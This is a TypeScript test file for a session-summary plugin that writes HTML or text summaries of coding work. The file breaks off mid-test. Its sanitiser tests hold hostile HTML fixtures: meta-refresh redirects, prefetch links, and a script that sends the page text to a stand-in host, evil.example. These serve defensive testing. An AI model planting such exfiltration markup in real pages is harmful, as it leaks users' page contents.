import { describe, expect, mock, test } from "claude-code/testing";

import {
  CHECK_EVERY,
  cleanText,
  digest,
  emptyActivity,
  extractHtml,
  fmtTime,
  hasTab,
  isCheckDue,
  isRewriteDue,
  MIN_GAP_MS,
  jevBigRequest,
  jevProgressRequest,
  jevUpdateRequest,
  liveShells,
  logTool,
  mayBeBig,
  parseJev,
  parseTabId,
  placeholderHtml,
  PROGRESS_EVERY_MS,
  securePage,
  SUMMARY_CSP,
  summaryPrompt,
  summarySystem,
  textBlocks,
  TEXT_WIDTH,
  toolLine,
  type Message,
} from "../hooks/core.ts";

const bgShell = (id: string, command: string): Message => ({
  role: "assistant",
  text: "",
  toolUses: [
    {
      tool: "Bash",
      input: { command, run_in_background: true },
      text: `Command running in background with ID: ${id}. Output is being written to: /t/tasks/${id}.output. You will be notified when it completes.`,
    },
  ],
});
const shellEnded = (id: string): Message => ({
  role: "user",
  text: `<task-notification>\n<task-id>${id}</task-id>\n<status>completed</status>\n</task-notification>`,
  toolUses: [],
});

describe("core", () => {
  test("liveShells: background shells started and not yet ended, with their output files", () => {
    const messages: Message[] = [
      bgShell("b1", "cargo test"),
      bgShell("b2", "npm run build"),
      {
        role: "assistant",
        text: "",
        toolUses: [
          { tool: "Bash", input: { command: "ls" }, text: "a\nb" },
          { tool: "Bash", input: { command: "sleep 9" } }, // not answered yet
        ],
      },
      shellEnded("b1"),
      bgShell("b3", "make bench"),
    ];
    expect(liveShells(messages)).toEqual([
      { id: "b2", command: "npm run build", outputFile: "/t/tasks/b2.output" },
      { id: "b3", command: "make bench", outputFile: "/t/tasks/b3.output" },
    ]);
    expect(liveShells([])).toEqual([]);
  });


  test("logTool counts calls; edits once each; commands and agents cut short", () => {
    let a = emptyActivity("add send later");
    a = logTool(a, "Read", { file_path: "/r/a.ts" });
    a = logTool(a, "Edit", { file_path: "/r/a.ts" });
    a = logTool(a, "Write", { file_path: "/r/a.ts" });
    a = logTool(a, "NotebookEdit", { notebook_path: "/r/n.ipynb" });
    a = logTool(a, "Bash", { command: "x".repeat(300) });
    a = logTool(a, "Agent", { description: "map callers", prompt: "go" });
    expect(a.tools).toBe(6);
    expect(a.edits).toEqual(["/r/a.ts", "/r/n.ipynb"]);
    expect(a.commands[0]?.length).toBe(200);
    expect(a.commands[0]?.endsWith("…")).toBe(true);
    expect(a.agents).toEqual(["map callers"]);
  });

  test("at most 30 commands are kept", () => {
    let a = emptyActivity("");
    for (let i = 0; i < 40; i++) a = logTool(a, "Bash", { command: `c${i}` });
    expect(a.commands.length).toBe(30);
    expect(a.tools).toBe(40);
  });

  test("a check is due every CHECK_EVERY calls; only edits may be big", () => {
    let a = emptyActivity("");
    expect(isCheckDue(a)).toBe(false);
    for (let i = 0; i < CHECK_EVERY; i++) a = logTool(a, "Read", {});
    expect(isCheckDue(a)).toBe(true);
    expect(mayBeBig(a)).toBe(false);
    expect(mayBeBig(logTool(a, "Edit", { file_path: "/x" }))).toBe(true);
  });

  test("a rewrite is due first, at a turn's end, or MIN_GAP_MS after the last", () => {
    expect(isRewriteDue(1_000, undefined, false)).toBe(true);
    expect(isRewriteDue(MIN_GAP_MS - 1, 0, false)).toBe(false);
    expect(isRewriteDue(MIN_GAP_MS, 0, false)).toBe(true);
    expect(isRewriteDue(1, 0, true)).toBe(true);
  });

  test("Jev: one yes/no question, big over the turn, update over the work since", () => {
    const turn = logTool(emptyActivity("refactor auth"), "Edit", {
      file_path: "/r/auth.rs",
    });
    const big = jevBigRequest(turn);
    expect(big.model).toBe("jev-latest");
    expect(big.state).toMatchObject({
      request: "refactor auth",
      filesChanged: ["/r/auth.rs"],
    });
    expect(Object.keys(big.questions)).toEqual(["big"]);

    const since = logTool(emptyActivity(""), "Write", { file_path: "/r/t.rs" });
    const upd = jevUpdateRequest(turn, since);
    expect(upd.state).toMatchObject({
      request: "refactor auth",
      workSinceTheSummary: { filesChanged: ["/r/t.rs"] },
    });
    expect(Object.keys(upd.questions)).toEqual(["update"]);
  });

  test("Jev: progress asks over the running commands' latest output", () => {
    const body = jevProgressRequest(emptyActivity("run the suite"), [
      { command: "cargo test", tail: "test a ... ok" },
    ]);
    expect(Object.keys(body.questions)).toEqual(["progress"]);
    expect(body.state).toEqual({
      request: "run the suite",
      runningCommands: [{ command: "cargo test", latestOutput: "test a ... ok" }],
    });
  });

  test("parseJev reads the named question's p(yes) and refuses anything else", () => {
    const reply = (name: string, a: unknown) =>
      JSON.stringify({ answers: { [name]: a } });
    expect(parseJev(reply("big", { type: "noul", noul: 0.83 }), "big")).toBe(
      0.83,
    );
    expect(parseJev(reply("big", { noul: 0.83 }), "update")).toBeUndefined();
    expect(parseJev(reply("update", { noul: 1.2 }), "update")).toBeUndefined();
    expect(parseJev(reply("big", { noul: "0.8" }), "big")).toBeUndefined();
    expect(parseJev(JSON.stringify({ error: "nope" }), "big")).toBeUndefined();
    expect(parseJev("<html>", "big")).toBeUndefined();
  });

  const msgs: Message[] = [
    { role: "user", text: "add send later", toolUses: [] },
    {
      role: "assistant",
      text: "I'll start with the composer.",
      toolUses: [
        { tool: "Edit", input: { file_path: "/r/composer.tsx" } },
        { tool: "Bash", input: { command: "pnpm test\n--watch" } },
        { tool: "TodoWrite", input: { todos: [] } },
      ],
    },
    { role: "user", text: "", toolUses: [], toolResults: [{}] },
    {
      role: "user",
      text: "<system-reminder>x</system-reminder>",
      toolUses: [],
    },
  ];

  test("digest: what was typed, said and used; tool results and tags left out", () => {
    expect(digest(msgs)).toBe(
      [
        "USER: add send later",
        "CLAUDE: I'll start with the composer.",
        "  → Edit /r/composer.tsx",
        "  → Bash pnpm test",
        "  → TodoWrite",
      ].join("\n"),
    );
  });

  test("digest keeps the newest lines that fit", () => {
    expect(digest(msgs, 40)).toBe("  → Bash pnpm test\n  → TodoWrite");
    expect(toolLine("Grep", { pattern: "snapshot_" })).toBe("Grep snapshot_");
  });

  test("the system prompt carries show-me and the page's contract", () => {
    const s = summarySystem("SHOW-ME-TEXT", "html");
    expect(s).toContain("<show-me>\nSHOW-ME-TEXT\n</show-me>");
    expect(s).toContain("write no <script> at all");
    expect(s).toContain("starting with <!doctype html>");
    const t = summarySystem("SHOW-ME-TEXT", "text");
    expect(t).toContain("<show-me>\nSHOW-ME-TEXT\n</show-me>");
    expect(t).toContain(`no line of a diagram wider than ${TEXT_WIDTH} characters`);
    expect(t).toContain("box-drawing characters");
    expect(t).not.toContain("<!doctype");
  });

  test("cleanText drops escape sequences and control characters", () => {
    expect(cleanText("\x1b[31mred\x1b[0m\r\nok\x07\tx\x1b]0;title\x07!")).toBe(
      "red\nok  x!",
    );
  });

  test("textBlocks: headings, paragraphs joined, sketches kept as written", () => {
    const summary = [
      "# Rate limiter",
      "",
      "A token bucket per",
      "client.",
      "```",
      "┌──────┐   ┌───────┐",
      "│ take │──▶│ store │",
      "",
      "└──────┘   └───────┘",
      "```",
      "## Next",
      "Wire it in.",
      "```",
      "unclosed",
    ].join("\n");
    expect(textBlocks(summary)).toEqual([
      { kind: "heading", lines: ["Rate limiter"] },
      { kind: "prose", lines: ["A token bucket per client."] },
      {
        kind: "sketch",
        lines: ["┌──────┐   ┌───────┐", "│ take │──▶│ store │", "", "└──────┘   └───────┘"],
      },
      { kind: "heading", lines: ["Next"] },
      { kind: "prose", lines: ["Wire it in."] },
      { kind: "sketch", lines: ["unclosed"] },
    ]);
  });

  test("the prompt: the session, and the previous page to update", () => {
    expect(summaryPrompt("USER: x")).toBe(
      "<session>\nUSER: x\n</session>\n\nWrite the summary of this session's work.",
    );
    const upd = summaryPrompt("USER: x", "<html>old</html>");
    expect(upd).toContain(
      "<previous-summary>\n<html>old</html>\n</previous-summary>",
    );
    expect(upd).toContain("Update the previous summary");
  });

  test("the prompt carries the running commands only when there are some", () => {
    expect(summaryPrompt("S", "P", [])).toBe(summaryPrompt("S", "P"));
    const p = summaryPrompt("S", undefined, [
      { command: "cargo test", tail: "12/40 passed" },
    ]);
    expect(p).toContain(
      "</session>\n\n<running-commands>\nThese commands are still running; show where they stand.\n$ cargo test\n12/40 passed\n</running-commands>",
    );
    expect(p).toContain("Write the summary");
  });

  test("extractHtml drops fences and prose; none without a whole page", () => {
    const page = "<!doctype html><html><body>hi</body></html>";
    expect(extractHtml(`Here:\n\`\`\`html\n${page}\n\`\`\`\nDone.`)).toBe(page);
    expect(extractHtml("<html lang=en><p>x</p></html>")).toBe(
      "<html lang=en><p>x</p></html>",
    );
    expect(extractHtml("<!doctype html><html><body>cut")).toBeUndefined();
    expect(extractHtml("no page here")).toBeUndefined();
  });

  test("placeholder escapes its text", () => {
    expect(placeholderHtml("a <b> & c")).toContain(
      "<p>a &lt;b&gt; &amp; c</p>",
    );
  });

  test("securePage: the model's scripts, metas and links go; the CSP and Mermaid loader lead", () => {
    const evil = `<!doctype html><html><head>
<meta http-equiv="refresh" content="0;url=https://evil.example">
<meta http-equiv="&#x72;efresh" content="0;url=https://evil.example">
<meta content="0;url=https://evil.example" http-equiv=REFRESH>
<link rel="dns-prefetch" href="//secret.evil.example"><LINK rel=preconnect href=https://evil.example>
<script>fetch("https://evil.example/?" + document.body.innerText)</script>
<SCRIPT src="https://evil.example/x.js"></SCRIPT >
</head><body><pre class="mermaid">graph TD; A-->B</pre><scr<script>x()</script>ipt>alert(1)</script><script>unclosed`;
    const page = securePage(evil);
    expect(page).not.toMatch(/evil\.example|alert/);
    expect(page.match(/<script/gi)?.length).toBe(1); // the loader alone
    expect(page.match(/<meta/gi)?.length).toBe(2); // the charset and the CSP alone
    expect(page).not.toMatch(/<link/i);
    expect(page.startsWith(
      `<!doctype html>\n<meta charset="utf-8">\n<meta http-equiv="Content-Security-Policy" content="${SUMMARY_CSP}">\n<script type="module">import mermaid`,
    )).toBe(true);
    expect(page).toContain('<pre class="mermaid">graph TD; A-->B</pre>');
    expect(SUMMARY_CSP).toContain("default-src 'none'");
    expect(SUMMARY_CSP).toContain(
      "script-src 'sha256-Olg3I0JmxL6iPaXBstF8PxlFzHJ/YejN9UP70TigNEw=' https://cdn.jsdelivr.net/npm/mermaid@11.4.1/;",
    );
    const scriptSrc = SUMMARY_CSP.split("; ").find((d) => d.startsWith("script-src"))!;
    expect(scriptSrc).not.toMatch(/unsafe-inline|unsafe-eval/);
  });

  test("orca's JSON: the new tab's id, and whether a tab is listed", () => {
    const created = JSON.stringify({
      ok: true,
      result: { browserPageId: "p1" },
    });
    expect(parseTabId(created)).toBe("p1");
    expect(parseTabId("{}")).toBeUndefined();
    expect(parseTabId("not json")).toBeUndefined();
    const list = (ids: string[]) =>
      JSON.stringify({
        result: { tabs: ids.map((browserPageId) => ({ browserPageId })) },
      });
    expect(hasTab(list(["p0", "p1"]), "p1")).toBe(true);
    expect(hasTab(list([]), "p1")).toBe(false);
    expect(hasTab("oops", "p1")).toBe(false);
  });

  test("time of day", () => {
    expect(fmtTime(new Date(2026, 9, 13, 9, 5).getTime())).toBe("09:05");
  });
});

const BAND = {
  component: "AbovePrompt" as const,
  props: {
    hasSurvey: false,
    isWorking: false,
    maxRows: 10,
    bodyColumns: 120,
    scroll: { offset: 0, bodyRows: 10 },
    view: {},
  } as never,
};

const PANE = {
  component: "Pane" as const,
  requestId: "big-picture",
  props: {
    title: "Big picture",
    isFocused: false,
    bodyColumns: 60,
    placement: "dock",
    scroll: { offset: 0, bodyRows: 30 },
    view: {},
  } as never,
};

const PAGE = "/h/.claude/big-picture/s1.html";
const html = (n: number) =>
  `<!doctype html><html><body>summary ${n}</body></html>`;

function engine(
  on: any,
  over: { env?: Record<string, string>; status?: number } = {},
) {
  const seen = {
    /** Jev's p(yes) by question. */
    p: { big: 0.9, update: 0.9, progress: 0.9 } as Record<string, number>,
    /** The transcript `$.session.messages()` gives. */
    messages: [
      { role: "user", text: "add send later", toolUses: [] },
    ] as Message[],
    /** Background shells' output, by file. */
    outputs: new Map<string, string>(),
    /** The question of each Jev call, in order. */
    asked: [] as string[],
    bodies: [] as any[],
    writes: [] as {
      model: string;
      systemBlocks: any;
      prompt: string;
      maxTokens?: number;
    }[],
    reply: undefined as any,
    /** While set, Haiku's reply waits for it. */
    gate: undefined as Promise<void> | undefined,
    files: new Map<string, string>(),
    orca: [] as string[],
    tabs: [] as string[],
    toasts: [] as string[],
    /** While set, `orca tab list` waits for it. */
    listGate: undefined as Promise<void> | undefined,
    /** Whether the summary's pane is open, and how often it was opened. */
    pane: false,
    paneOpens: 0,
  };
  const clock = mock.clock(on, { now: new Date(2026, 9, 13, 9, 5).getTime() });
  mock.env(on, {
    HOME: "/h",
    TERM_PROGRAM: "Orca",
    TYPESAFE_API_KEY: "k",
    ...over.env,
  });
  on("ui.render", () => h("Box", null));
  on("command.register", () => ({ value: undefined }));
  on("session.start", (_$: unknown, e: unknown) => e);
  on("session.id", () => ({ value: "s1" }));
  on("session.messages", () => ({ value: seen.messages }));
  on("prompt.submit", (_$: unknown, e: { text: string }) => ({ text: e.text }));
  on("tool.call", () => ({ result: "" }));
  on("turn.complete", (_$: unknown, e: { answer: string }) => ({
    text: e.answer,
  }));
  on("ui.open", () => {
    seen.pane = true;
    seen.paneOpens++;
    return { value: { isPlaced: true } };
  });
  on("ui.close", () => ((seen.pane = false), { value: undefined }));
  on("ui.panes", () => ({ value: [] }));
  on("ui.toast", (_$: unknown, e: { text: string }) => {
    seen.toasts.push(e.text);
    return { value: undefined };
  });
  on(
    "http.fetch",
    (_$: unknown, e: { url: string; init: { body: string } }) => {
      const body = JSON.parse(e.init.body);
      const name = Object.keys(body.questions)[0]!;
      seen.asked.push(name);
      seen.bodies.push(body);
      const status = over.status ?? 200;
      return {
        value: {
          status,
          ok: status === 200,
          headers: {},
          text: JSON.stringify({
            answers: { [name]: { type: "noul", noul: seen.p[name] } },
          }),
        },
      };
    },
  );
  on("model.complete", async (_$: unknown, e: any) => {
    seen.writes.push(e);
    await seen.gate;
    const reply = seen.reply ?? {
      isAnswered: true,
      text: `\`\`\`html\n${html(seen.writes.length)}\n\`\`\``,
    };
    return { value: { usage: {}, ...reply } };
  });
  on("fs.write", (_$: unknown, e: { path: string; text: string }) => {
    seen.files.set(e.path, e.text);
    return { value: undefined };
  });
  on("fs.exists", (_$: unknown, e: { path: string }) => ({
    value: seen.files.has(e.path),
  }));
  on("process.run", async (_$: unknown, e: { argv: string[] }) => {
    const [cmd, ...args] = e.argv;
    let stdout = "";
    let exitCode = 0;
    if (cmd === "tail") {
      const out = seen.outputs.get(args.at(-1)!);
      if (out === undefined) exitCode = 1;
      else stdout = out;
    } else if (cmd === "orca") {
      seen.orca.push(args.join(" "));
      const page = args[args.indexOf("--page") + 1] ?? "";
      if (args[0] === "tab" && args[1] === "create") {
        const id = `pg${seen.orca.length}`;
        seen.tabs.push(id);
        stdout = JSON.stringify({ ok: true, result: { browserPageId: id } });
      } else if (args[0] === "tab" && args[1] === "list") {
        await seen.listGate;
        stdout = JSON.stringify({
          result: {
            tabs: seen.tabs.map((browserPageId) => ({ browserPageId })),
          },
        });
      } else if (args[0] === "tab" && args[1] === "close") {
        seen.tabs = seen.tabs.filter((t) => t !== page);
      } else if (args[0] === "reload") {
        exitCode = seen.tabs.includes(page) ? 0 : 1;
      }
    }
    return {
      value: {
        exitCode,
        stdout,
        stderr: "",
        isStdoutTruncated: false,
        isStderrTruncated: false,
      },
    };
  });
  return { seen, clock };
}

const prompt = ($: any, text: string) => $.prompt.submit({ text, wait: false });
const tools = async ($: any, n: number, tool = "Read") => {
  for (let i = 0; i < n; i++)
    await $.tool.call({
      tool,
      file_path: `/r/f${i}.ts`,
      old_string: "a",
      new_string: "b",
    });
};
const turnEnd = ($: any) =>
  $.turn.complete({
    answer: "",
    durationMs: 1,
    isAborted: false,
    turnId: "t",
    reason: "answer",
  });
const band = async ($: any) => {
  const ui = await $.ui.mount({
    plugin: "big-picture",
    surface: "terminal",
    ...BAND,
  });
  const texts = (await ui.findAll({ type: "Text" })).map((t: any) => t.text);
  const toggle = (await ui.find({ key: "big-picture-toggle" }))?.text;
  await ui.unmount();
  return { texts, toggle };
};
/** A turn: the prompt, n tool calls, its end, and the checks run. */
const turn = async (
  $: any,
  clock: any,
  text: string,
  n: number,
  tool = "Edit",
) => {
  await prompt($, text);
  await tools($, n, tool);
  await turnEnd($);
  await clock.advance(1);
};

describe("session", () => {
  test("work that changed no file never asks Jev", async ($, on) => {
    const { seen, clock } = engine(on);
    await turn($, clock, "explain the auth flow", 25, "Read");
    expect([seen.asked, seen.writes.length]).toEqual([[], 0]);
  });

  test("big work: Jev at the 10th call, Haiku writes the page", async ($, on) => {
    const { seen, clock } = engine(on);
    await prompt($, "add send later to the composer");
    await tools($, 9);
    await clock.advance(1);
    expect(seen.asked).toEqual([]);
    await tools($, 1, "Edit");
    await clock.advance(1);
    expect(seen.asked).toEqual(["big"]);
    expect(seen.bodies[0].state.filesChanged).toEqual(["/r/f0.ts"]);

    expect(seen.writes.length).toBe(1);
    const w = seen.writes[0]!;
    expect(w.model).toBe("haiku");
    expect(w.maxTokens).toBe(16_000);
    expect(w.systemBlocks).toEqual([
      { text: expect.stringContaining("<show-me>"), cache: true },
    ]);
    expect(w.prompt).toBe(summaryPrompt("USER: add send later"));
    expect(seen.files.get(PAGE)).toBe(securePage(html(1)));
    expect(seen.orca.filter((c) => c.startsWith("tab create"))).toEqual([]); // never opens itself
    expect((await band($)).texts).toContain("updated 09:05");
  });

  test("small work: no page, no line", async ($, on) => {
    const { seen, clock } = engine(on);
    expect((await band($)).texts).toEqual([]);
    seen.p.big = 0.2;
    await turn($, clock, "rename a var", 1);
    expect([seen.asked, seen.writes.length]).toEqual([["big"], 0]);
    expect((await band($)).texts).toEqual([]);
  });

  test("the line hides while Jev judges work with no summary, shows while it is written", async ($, on) => {
    const { seen, clock } = engine(on);
    let open!: () => void;
    seen.gate = new Promise<void>((r) => (open = r));
    await prompt($, "big refactor");
    await tools($, 10, "Edit");
    await clock.advance(1);
    expect((await band($)).texts).toContain("● writing…");
    open();
    await clock.advance(1);
    expect((await band($)).texts).toContain("updated 09:05");
  });

  test("once big, Jev decides each update; Haiku updates the last page", async ($, on) => {
    const { seen, clock } = engine(on);
    await turn($, clock, "big refactor", 10);
    expect([seen.asked, seen.writes.length]).toEqual([["big"], 1]);
    await $.command.run({ command: "big-picture", args: "" } as never);
    expect(seen.tabs).toEqual(["pg1"]);

    await turn($, clock, "now the tests", 1, "Write");
    expect(seen.asked).toEqual(["big", "update"]); // turn end after the page: nothing new
    expect(seen.bodies[1].state.workSinceTheSummary.filesChanged).toEqual([
      "/r/f0.ts",
    ]);
    expect(seen.writes.length).toBe(2);
    expect(seen.writes[1]!.prompt).toBe(
      summaryPrompt("USER: add send later", html(1)),
    );
    expect(seen.files.get(PAGE)).toBe(securePage(html(2)));
    expect(seen.orca).toContain("reload --page pg1 --json");

    seen.p.update = 0.1; // Jev: nothing worth redrawing
    await turn($, clock, "fix a typo", 1);
    expect(seen.asked.at(-1)).toBe("update");
    expect(seen.writes.length).toBe(2);

    const asked = seen.asked.length;
    await turn($, clock, "what does this do?", 3, "Read");
    expect(seen.asked.length).toBe(asked); // no file changed: Jev not asked
  });

  test("mid-turn rewrites are 5 minutes apart; Jev is not asked in between", async ($, on) => {
    const { seen, clock } = engine(on);
    await prompt($, "big refactor");
    await tools($, 10, "Edit");
    await clock.advance(1);
    expect([seen.asked, seen.writes.length]).toEqual([["big"], 1]);

    await clock.advance(4 * 60_000);
    await tools($, 10, "Write");
    await clock.advance(1);
    expect([seen.asked, seen.writes.length]).toEqual([["big"], 1]); // 4 min: too soon

    await clock.advance(60_000);
    await tools($, 10, "Write");
    await clock.advance(1);
    expect([seen.asked, seen.writes.length]).toEqual([["big", "update"], 2]);
    // the update covers the work held back too
    expect(seen.bodies[1].state.workSinceTheSummary.toolCalls).toBe(20);
  });

  test("a turn's end may rewrite inside the gap", async ($, on) => {
    const { seen, clock } = engine(on);
    await prompt($, "big refactor");
    await tools($, 10, "Edit");
    await clock.advance(1);
    await clock.advance(60_000);
    await tools($, 1, "Write");
    await turnEnd($);
    await clock.advance(1);
    expect([seen.asked, seen.writes.length]).toEqual([["big", "update"], 2]);
  });

  test("work done while Haiku writes is kept for the next update", async ($, on) => {
    const { seen, clock } = engine(on);
    let release = () => {};
    seen.gate = new Promise<void>((r) => (release = r));
    await prompt($, "big refactor");
    await tools($, 10, "Edit");
    await clock.advance(1); // Jev: big; Haiku is writing
    expect([seen.asked, seen.writes.length]).toEqual([["big"], 1]);

    await tools($, 2, "Write"); // not in the transcript Haiku was given
    await turnEnd($);
    seen.gate = undefined;
    release();
    await clock.advance(1);

    expect(seen.asked).toEqual(["big", "update"]);
    expect(seen.bodies[1].state.workSinceTheSummary.toolCalls).toBe(2);
    expect(seen.writes.length).toBe(2);
  });

  test("a failed write keeps its work for the next update", async ($, on) => {
    const { seen, clock } = engine(on);
    await turn($, clock, "big refactor", 10);
    seen.reply = { isAnswered: false, reason: "api-error", status: 529 };
    await turn($, clock, "tests", 1, "Write"); // Jev: update; Haiku fails
    seen.reply = undefined;
    await turn($, clock, "more", 1);
    expect(seen.bodies.at(-1).state.workSinceTheSummary.toolCalls).toBe(2);
    expect(seen.writes.length).toBe(3);
  });

  test("work Jev turned down still counts toward the next update", async ($, on) => {
    const { seen, clock } = engine(on);
    await turn($, clock, "big refactor", 10);
    seen.p.update = 0.1;
    await turn($, clock, "tweak a", 1);
    seen.p.update = 0.9;
    await turn($, clock, "tweak b", 1, "Write");
    const last = seen.bodies.at(-1);
    expect(last.state.workSinceTheSummary.toolCalls).toBe(2);
    expect(seen.writes.length).toBe(2);
  });

  test("no API key: one toast, Jev never asked", async ($, on) => {
    const { seen, clock } = engine(on, { env: { TYPESAFE_API_KEY: "" } });
    await turn($, clock, "x", 10);
    await turn($, clock, "y", 1);
    expect(seen.asked).toEqual([]);
    expect(seen.toasts).toEqual(["big-picture: set TYPESAFE_API_KEY for Jev"]);
  });

  test("Jev failing shows on the line", async ($, on) => {
    const { seen, clock } = engine(on, { status: 401 });
    await turn($, clock, "x", 1);
    expect(seen.writes.length).toBe(0);
    expect((await band($)).texts).toContain("✗ Jev answered HTTP 401");
  });

  test("a reply with no page shows why; the next check writes it without asking", async ($, on) => {
    const { seen, clock } = engine(on);
    seen.reply = { isAnswered: true, text: "I can't." };
    await turn($, clock, "x", 1);
    expect(seen.files.has(PAGE)).toBe(false);
    expect((await band($)).texts).toContain("✗ the reply held no HTML page");

    seen.reply = { isAnswered: false, reason: "api-error", status: 529 };
    await turn($, clock, "y", 1);
    expect(seen.asked).toEqual(["big"]); // big already: no second question
    expect((await band($)).texts).toContain("✗ api-error");

    seen.reply = undefined;
    await turn($, clock, "z", 1);
    expect(seen.asked).toEqual(["big"]);
    expect(seen.files.get(PAGE)).toBe(securePage(html(3)));
  });

  test("a page injected with a script is written without it, under the CSP", async ($, on) => {
    const { seen, clock } = engine(on);
    seen.reply = {
      isAnswered: true,
      text: `<!doctype html><html><body>ok<script>fetch("https://evil.example")</script></body></html>`,
    };
    await turn($, clock, "x", 1);
    const page = seen.files.get(PAGE)!;
    expect(page).not.toContain("evil.example");
    expect(page).toContain(`content="${SUMMARY_CSP}"`);
    expect(page).toContain("<body>ok</body>");
  });

  test("the band toggles the Orca tab, a placeholder before any summary", async ($, on) => {
    const { seen, clock } = engine(on);
    const press = async () => {
      const ui = await $.ui.mount({
        plugin: "big-picture",
        surface: "terminal",
        ...BAND,
      });
      await ui.press({ key: "big-picture-toggle" });
      await ui.unmount();
    };
    expect((await band($)).toggle).toBeUndefined(); // nothing to show yet
    await $.command.run({ command: "big-picture", args: "" } as never);
    expect(seen.files.get(PAGE)).toContain("No big work in this session yet.");
    expect(seen.orca).toContain(`tab create --url file://${PAGE} --json`);
    expect((await band($)).toggle).toBe("hide");

    await press();
    expect(seen.tabs).toEqual([]);
    expect((await band($)).toggle).toBeUndefined(); // closed, and still nothing to show

    // with a summary written: closed in Orca by hand, the button turns to show by itself
    await turn($, clock, "big refactor", 10);
    expect((await band($)).toggle).toBe("show");
    await press();
    expect((await band($)).toggle).toBe("hide");
    seen.tabs = [];
    await clock.advance(2_000);
    expect((await band($)).toggle).toBe("show");
    await press();
    expect(seen.tabs.length).toBe(1);
    expect((await band($)).toggle).toBe("hide");
  });

  test("the tab is looked for one look at a time, however slow Orca answers", async ($, on) => {
    const { seen, clock } = engine(on);
    await $.command.run({ command: "big-picture", args: "" } as never);
    let open!: () => void;
    seen.listGate = new Promise<void>((r) => (open = r));
    await clock.advance(6_000); // three ticks while the first look hangs
    const lists = () => seen.orca.filter((c) => c.startsWith("tab list"));
    expect(lists()).toEqual(["tab list --json"]);
    seen.tabs = [];
    open();
    seen.listGate = undefined;
    await clock.advance(2_000);
    expect((await band($)).toggle).toBeUndefined(); // tab forgotten, nothing to show
  });

  test("presses while a show runs are dropped: one tab, not one per press", async ($, on) => {
    const { seen } = engine(on);
    const run = () => $.command.run({ command: "big-picture", args: "" } as never);
    const said = await Promise.all([run(), run(), run()]);
    expect(seen.orca.filter((c) => c.startsWith("tab create")).length).toBe(1);
    expect(said.map((r: any) => r.text)).toEqual([
      "Summary shown.",
      "Still showing or hiding the summary.",
      "Still showing or hiding the summary.",
    ]);
    expect((await band($)).toggle).toBe("hide");
  });

  test("outside Orca: a text summary in a terminal pane, toggled by the band", async ($, on) => {
    const { seen, clock } = engine(on, { env: { TERM_PROGRAM: "ghostty" } });
    const paneTexts = async () => {
      const ui = await $.ui.mount({ plugin: "big-picture", surface: "terminal", ...PANE });
      const texts = (await ui.findAll({ type: "Text" })).map((t: any) => t.text);
      await ui.unmount();
      return texts;
    };
    const run = () => $.command.run({ command: "big-picture", args: "" } as never);

    expect((await run()).text).toBe("Summary shown.");
    expect([seen.pane, (await band($)).toggle]).toEqual([true, "hide"]);
    expect((await paneTexts())[0]).toContain("No big work in this session yet.");

    seen.reply = {
      isAnswered: true,
      text: "# Rate limiter\n\nA bucket per client.\n```\n│ take │──▶│ store │\x1b[2J\n```",
    };
    await turn($, clock, "add a rate limiter", 1);
    expect(seen.writes[0]!.systemBlocks[0].text).toContain("box-drawing characters");
    expect(seen.files.size).toBe(0); // no page
    expect(seen.orca).toEqual([]);
    expect(await paneTexts()).toEqual([
      "Rate limiter",
      "A bucket per client.",
      "│ take │──▶│ store │",
    ]);
    expect((await band($)).texts).toContain("updated 09:05");

    // the update is handed the text it rewrites
    await turn($, clock, "add metrics", 1);
    expect(seen.writes[1]!.prompt).toContain("<previous-summary>\n# Rate limiter");

    expect((await run()).text).toBe("Summary hidden.");
    expect([seen.pane, (await band($)).toggle]).toEqual([false, "show"]);
  });

  test("every 30 minutes: running shells' new output asks Jev; a yes rewrites with it", async ($, on) => {
    const { seen, clock } = engine(on);
    await $.session.start({ cwd: "/r" } as never);
    await turn($, clock, "big refactor", 10);
    expect([seen.asked, seen.writes.length]).toEqual([["big"], 1]);

    seen.messages = [...seen.messages, bgShell("b1", "cargo test")];
    seen.outputs.set("/t/tasks/b1.output", "test a ... ok\x1b[0m");
    await clock.advance(PROGRESS_EVERY_MS);
    expect(seen.asked).toEqual(["big", "progress"]);
    expect(seen.bodies[1].state.runningCommands).toEqual([
      { command: "cargo test", latestOutput: "test a ... ok" },
    ]);
    expect(seen.writes.length).toBe(2);
    expect(seen.writes[1]!.prompt).toContain(
      "<running-commands>\nThese commands are still running; show where they stand.\n$ cargo test\ntest a ... ok\n</running-commands>",
    );
    expect(seen.writes[1]!.prompt).toContain(`<previous-summary>\n${html(1)}`);

    await clock.advance(PROGRESS_EVERY_MS); // same output: nothing asked
    expect(seen.asked.length).toBe(2);

    seen.p.progress = 0.1;
    seen.outputs.set("/t/tasks/b1.output", "test b ... ok");
    await clock.advance(PROGRESS_EVERY_MS);
    expect([seen.asked.length, seen.writes.length]).toEqual([3, 2]);
    await clock.advance(PROGRESS_EVERY_MS); // a no is not asked again on the same output
    expect(seen.asked.length).toBe(3);

    seen.messages = [...seen.messages, shellEnded("b1")];
    seen.outputs.set("/t/tasks/b1.output", "done");
    await clock.advance(PROGRESS_EVERY_MS); // ended: nothing running
    expect([seen.asked.length, seen.writes.length]).toEqual([3, 2]);
  });

  test("the timer asks nothing before a summary, nor for a shell whose output is gone", async ($, on) => {
    const { seen, clock } = engine(on);
    await $.session.start({ cwd: "/r" } as never);
    seen.messages = [...seen.messages, bgShell("b1", "cargo test")];
    seen.outputs.set("/t/tasks/b1.output", "running");
    await clock.advance(PROGRESS_EVERY_MS);
    expect(seen.asked).toEqual([]);

    await turn($, clock, "big refactor", 10);
    expect(seen.writes[0]!.prompt).toContain("$ cargo test\nrunning");
    seen.outputs.delete("/t/tasks/b1.output");
    await clock.advance(PROGRESS_EVERY_MS);
    expect(seen.asked).toEqual(["big"]);
  });

  test("a failed progress write is tried again on the same output", async ($, on) => {
    const { seen, clock } = engine(on);
    await $.session.start({ cwd: "/r" } as never);
    await turn($, clock, "big refactor", 10);
    seen.messages = [...seen.messages, bgShell("b1", "cargo test")];
    seen.outputs.set("/t/tasks/b1.output", "12/40");
    seen.reply = { isAnswered: false, reason: "api-error", status: 529 };
    await clock.advance(PROGRESS_EVERY_MS);
    expect([seen.asked, seen.writes.length]).toEqual([["big", "progress"], 2]);
    seen.reply = undefined;
    await clock.advance(PROGRESS_EVERY_MS);
    expect([seen.asked, seen.writes.length]).toEqual([
      ["big", "progress", "progress"],
      3,
    ]);
  });

  test("update: written now with no question, even before big work; presses while it writes run once after", async ($, on) => {
    const { seen, clock } = engine(on);
    const r = await $.command.run({ command: "big-picture", args: " update " } as never);
    expect((r as { text: string }).text).toBe("Updating the summary.");
    await clock.advance(1);
    expect([seen.asked, seen.writes.length]).toEqual([[], 1]);
